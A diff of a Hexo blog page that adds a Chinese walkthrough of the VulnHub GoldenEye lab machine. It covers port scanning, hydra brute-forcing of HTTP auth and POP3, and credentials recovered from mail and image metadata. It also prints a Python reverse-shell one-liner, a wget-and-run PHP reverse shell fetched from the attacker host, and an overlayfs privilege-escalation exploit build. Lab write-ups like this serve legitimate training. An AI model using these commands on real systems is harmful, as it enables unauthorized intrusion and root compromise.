@@ -228,7 +228,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2019/04/01/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2019/12/26/yuque/vulnhub-GoldenEye%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Unc1e">
@@ -247,7 +247,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/04/01/hello-world/" itemprop="url">Hello World</a></h1>
+                <a class="post-title-link" href="/2019/12/26/yuque/vulnhub-GoldenEye%E7%AC%94%E8%AE%B0/" itemprop="url">vulnhub-GoldenEye笔记</a></h1>
         
 
         <div class="post-meta">
@@ -259,8 +259,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-01T09:50:42+08:00">
-                2019-04-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-26T11:36:16+08:00">
+                2019-12-26
               </time>
             
 
@@ -298,14 +298,79 @@
 
       
         
-          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/04/01/hello-world/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 25/tcp open smtp</span></span><br><span class="line"></span><br><span class="line">| fingerprint-strings:</span><br><span class="line">| Hello:</span><br><span class="line">| 220 ubuntu GoldentEye SMTP Electronic-Mail agent</span><br><span class="line">|\_ Syntax: EHLO hostname</span><br><span class="line">|\_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,</span><br><span class="line"></span><br><span class="line"><span class="section"># 80/tcp open http Apache httpd 2.4.7 ((Ubuntu))</span></span><br><span class="line"></span><br><span class="line">| http-methods:</span><br><span class="line">|\_ Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|\_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|\_http-title: GoldenEye Primary Admin Server</span><br><span class="line"></span><br><span class="line"><span class="section"># 55006/tcp open ssl/pop3 Dovecot pop3d</span></span><br><span class="line"></span><br><span class="line">|\_pop3-capabilities: RESP-CODES TOP CAPA AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after: 2028-04-23T03:23:52</span><br><span class="line">| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">|\_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">|\_ssl-date: TLS randomness does not represent time</span><br><span class="line"></span><br><span class="line"><span class="section"># 55007/tcp open pop3 Dovecot pop3d</span></span><br><span class="line"></span><br><span class="line">|\_pop3-capabilities: RESP-CODES SASL(PLAIN) TOP PIPELINING STLS CAPA AUTH-RESP-CODE USER UIDL</span><br><span class="line">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Issuer: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-04-24T03:23:52</span><br><span class="line">| Not valid after: 2028-04-23T03:23:52</span><br><span class="line">| MD5: d039 2e71 c76a 2cb3 e694 ec40 7228 ec63</span><br><span class="line">|\_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77</span><br><span class="line">|\_ssl-date: TLS randomness does not represent time</span><br></pre></td></tr></table></figure>
+
+<p>扫出两个端口，25 端口尝试用 smtp 登录了下，失败</p>
+<h1 id="爆破-web-的-401-认证"><a href="#爆破-web-的-401-认证" class="headerlink" title="爆破 web 的 401 认证"></a>爆破 web 的 401 认证</h1><p>跟随首页提示，发现个 401 认证<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332091909-0d56efe2-45f3-4ead-a983-43c30d5dbf3c.png#align=left&display=inline&height=407&name=image.png&originHeight=813&originWidth=1282&size=72189&status=done&style=none&width=641" alt="image.png"></p>
+<p>接着 f12 审查首页的元素，发现某个 js 里有点东西</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577331873021-85db72cd-0376-4123-96c0-d13f17aa5645.png#align=left&display=inline&height=470&name=image-20191224184854033.png&originHeight=470&originWidth=1146&size=75216&status=done&style=none&width=1146" alt="image-20191224184854033.png"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># html 实体解码结果</span></span><br><span class="line"></span><br><span class="line">Boris:InvincibleHack3r</span><br></pre></td></tr></table></figure>
+
+<p>利用这个凭据，再结合刚刚的那个 401 认证界面，用各个用户名尝试登录，都失败了。。。不应该啊<br>接着我试着采取常用的<a href="https://www.cnblogs.com/xinaixia/p/5852688.html" target="_blank" rel="noopener">绕过 Web 授权和认证之篡改 HTTP 请求</a>手法，用 POST, OPTIONS, HEAD 来尝试绕过 401 认证，也失败了。</p>
+<p>最后实在不行，准备爆破 401 认证了，按如下配置（还好用户名里加了条小写的 boris）<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577331651331-b28c5534-3dca-4e71-898b-88df543966e6.png#align=left&display=inline&height=421&name=image.png&originHeight=841&originWidth=1175&size=205359&status=done&style=none&width=587.5" alt="image.png"></p>
+<p>顺利得到结果</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332155829-a707cd9d-2177-422f-9175-9d9724839942.png#align=left&display=inline&height=467&name=image.png&originHeight=934&originWidth=822&size=108946&status=done&style=none&width=411" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577332628819-02f9f05c-a270-401b-8131-f2e10054eee0.png#align=left&display=inline&height=143&name=image.png&originHeight=287&originWidth=540&size=9713&status=done&style=none&width=269" alt="image.png"></p>
+<h1 id="爆破邮件服务器"><a href="#爆破邮件服务器" class="headerlink" title="爆破邮件服务器"></a>爆破邮件服务器</h1><p>顺利进入后台，界面如图<br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577342792459-110ce689-12c8-4a63-b8e3-062090e73119.png#align=left&display=inline&height=438&name=image.png&originHeight=876&originWidth=1738&size=748466&status=done&style=none&width=869" alt="image.png">看到这段描述（源码里看到还提供了俩用户名），就将目标放在邮件服务器 pop3 上</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Qualified GoldenEye Network Operator Supervisors:</span><br><span class="line">Natalya</span><br><span class="line">Boris</span><br></pre></td></tr></table></figure>
+
+<p>用 hydra 尝试爆破，使用的是 kali 自带的 fastrack 字典<br><code>hydra -l boris -P /usr/share/wordlists/fasttrack.txt 192.168.111.5 -s55007 pop3 -V -I</code><br><img src="https://cdn.nlark.com/yuque/0/2019/png/166008/1577342725160-84abf4d9-3516-4901-9b76-8787feb5c0ed.png#align=left&display=inline&height=171&name=image.png&originHeight=342&originWidth=1518&size=307010&status=done&style=none&width=759" alt="image.png"></p>
+<p>爆破结果，得到两组账号，登录 pop3，深入查看邮件信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992352181-ee562c6a-a891-4757-b8e1-a0397303d326.png#align=left&display=inline&height=67&name=image.png&originHeight=133&originWidth=1047&size=58357&status=done&style=none&width=523.5" alt="image.png"></p>
+<h2 id="POP3-命令"><a href="#POP3-命令" class="headerlink" title="POP3 命令"></a>POP3 命令</h2><p>pop3 的登录，可以用 netcat 来连，在这里记录下 POP3 明文连接的命令<br>默认监听的 TCP 端口为 110</p>
+<table>
+<thead>
+<tr>
+<th>USER [username]</th>
+<th>处理用户名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>PASS [password]</td>
+<td>处理用户密码</td>
+</tr>
+<tr>
+<td>LIST [Msg#]</td>
+<td>处理返回邮件数量和每个邮件的大小，不跟参数会返回邮件的列表</td>
+</tr>
+<tr>
+<td>RETR [Msg#]</td>
+<td>处理返回由参数标识的邮件的全部文本</td>
+</tr>
+<tr>
+<td>DELE [Msg#]</td>
+<td>将参数标识的邮件标记为删除，由 quit 命令执行</td>
+</tr>
+<tr>
+<td>RSET</td>
+<td>重置所有标记为删除的邮件，用于撤消 DELE 命令</td>
+</tr>
+<tr>
+<td>QUIT</td>
+<td>终止会话</td>
+</tr>
+</tbody></table>
+<p>翻找邮件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992105987-1b15c3e6-291a-4fcb-a7dd-e6f3e3e72010.png#align=left&display=inline&height=360&name=image.png&originHeight=719&originWidth=1216&size=91116&status=done&style=none&width=608" alt="image.png"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line"><span class="code">    username: xenia</span></span><br><span class="line"><span class="code">    password: RCP90rulez!</span></span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">\<span class="emphasis">*\*</span>Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line">Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure>
+
+<p>邮件让咱们先绑 host，再访问<code>severnaya-station.com</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578992787482-a46918b1-60e7-4095-a733-b524632eaca8.png#align=left&display=inline&height=428&name=image.png&originHeight=856&originWidth=1444&size=188952&status=done&style=none&width=722" alt="image.png"><br>直接访问 ip 失败，绑完 host 能访问了，是个慕课网站；翻到一条信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994260782-dfdb001d-60b0-4a27-8758-b431a4665adb.png#align=left&display=inline&height=275&name=image.png&originHeight=550&originWidth=1907&size=222978&status=done&style=none&width=953.5" alt="image.png">暗示邮箱爆破？好吧，满足你！一样用 hydra 爆破，fastrack 字典，出结果</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994015693-d7aa86a7-6c1f-4c27-97b5-247efddcf4fc.png#align=left&display=inline&height=27&name=image.png&originHeight=54&originWidth=1568&size=29768&status=done&style=none&width=784" alt="image.png"></p>
+<p>一样用 netcat 登录，查看邮件<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994383131-4ed40b9a-6b45-4835-8c3a-c28305b519df.png#align=left&display=inline&height=231&name=image.png&originHeight=463&originWidth=1369&size=92725&status=done&style=none&width=684.5" alt="image.png"><br>又获得一组账号密码<code>dr_doak-4England!</code>，感觉是老师的账号，登进去看看<br>很遗憾，并不是老师的账号，也没有导入问题的地方。。。</p>
+<p>不过随即又找到一些信息，在 private file 里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578994667466-8f3ac632-68c1-4c6b-a730-ad8ce19fe7b1.png#align=left&display=inline&height=254&name=image.png&originHeight=507&originWidth=1894&size=121665&status=done&style=none&width=947" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578995362835-2ca727d3-ad77-4f3e-ade7-8452b865640b.png#align=left&display=inline&height=478&name=image.png&originHeight=956&originWidth=1536&size=751445&status=done&style=none&width=768" alt="image.png"><br>根据下载的图片，用打开发现 eof 后面再没有内容了，不过在 exif 里发现了好东西，base64 编码的一串东西</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; file <span class="keyword">for</span>-007.jpg</span></span><br><span class="line">for-007.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300,</span><br><span class="line">segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7,</span><br><span class="line">description=eFdpbnRlcjE5OTV4IQ==, manufacturer=GoldenEye, resolutionunit=2, software=linux], baseline, precision 8, 313x212, components 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt; <span class="built_in">echo</span> <span class="string">'eFdpbnRlcjE5OTV4IQ=='</span> |base64 -d</span></span><br><span class="line">xWinter1995x!</span><br></pre></td></tr></table></figure>
+
+<p>解码，慕课网站 admin 的密码到手！</p>
+<h1 id="拿-shell"><a href="#拿-shell" class="headerlink" title="拿 shell"></a>拿 shell</h1><p>利用上传点上传 shell，反弹 msf 的 shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> /var/www/html/gnocertdir/</span></span><br><span class="line">/gnocertdir/draftfile.php/5/user/draft/810667993/reverse_php.php</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> /var/www/html/gnocertdir/draftfile.php/5/user/draft/810667993/reverse_php.php</span></span><br></pre></td></tr></table></figure>
+
+<p>命令执行点</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿webshell</span></span><br><span class="line"><span class="comment"># Home / ► Site administration / ► Server / ► System paths</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.111.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home / ► Site administration / ► Plugins / ► Text editors / ► TinyMCE HTML editor#</span></span><br><span class="line">设置pspellshell为spell engine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹初始shell</span></span><br><span class="line">wget http://<span class="number">192.168</span><span class="number">.111</span><span class="number">.3</span>/reverse_php.php</span><br><span class="line">chmod +x reverse_php.php</span><br><span class="line">php -f  reverse_php.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580292657601-c4393dd1-c966-40de-883e-37cdd03677fe.png#align=left&display=inline&height=407&name=image.png&originHeight=814&originWidth=1156&size=140969&status=done&style=none&width=578" alt="image.png"><br>TinyMCEHTMLeditor<br>Spellengine<br>PSpellshell<br>Default:GoogleSpell<br>editortinymcespellengine<br>Spelllanguagelist<br>+English-en,Danish-da,uhninniDefault<br>editortinymcespelllanguagelist<br>+Englishen,Danishda,Duhih</p>
+<pre><code>![image.png](https://cdn.nlark.com/yuque/0/2020/png/166008/1580291233722-138acd03-34cf-4bc3-81a0-86fefe890992.png)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overlayfs提权</span></span><br><span class="line"><span class="comment">#	ref:https://www.exploit-db.com/download/37292.c</span></span><br><span class="line"></span><br><span class="line">sed -i <span class="string">'s/gcc/cc/g'</span> overlay.c <span class="comment"># 系统内没有gcc,所以只能用cc代替</span></span><br><span class="line"><span class="comment">#	sed跟选项-i，会匹配文件中每一行的第一个gcc替换为cc</span></span><br><span class="line"><span class="comment">#	后缀 /g 标记会替换每一行中的所有匹配：</span></span><br><span class="line">cc overlay.c -o overlay</span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580292490126-49a36680-950f-458e-b81d-b8a3f635fe6e.png#align=left&display=inline&height=338&name=image.png&originHeight=676&originWidth=914&size=97075&status=done&style=none&width=457" alt="image.png"></p>
+
+          
         
       
     </div>
@@ -343,7 +408,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/18/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span>
+    <a class="extend prev" rel="prev" href="/page/18/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="extend next" rel="next" href="/page/20/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
   </nav>
 
 
@@ -389,7 +454,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
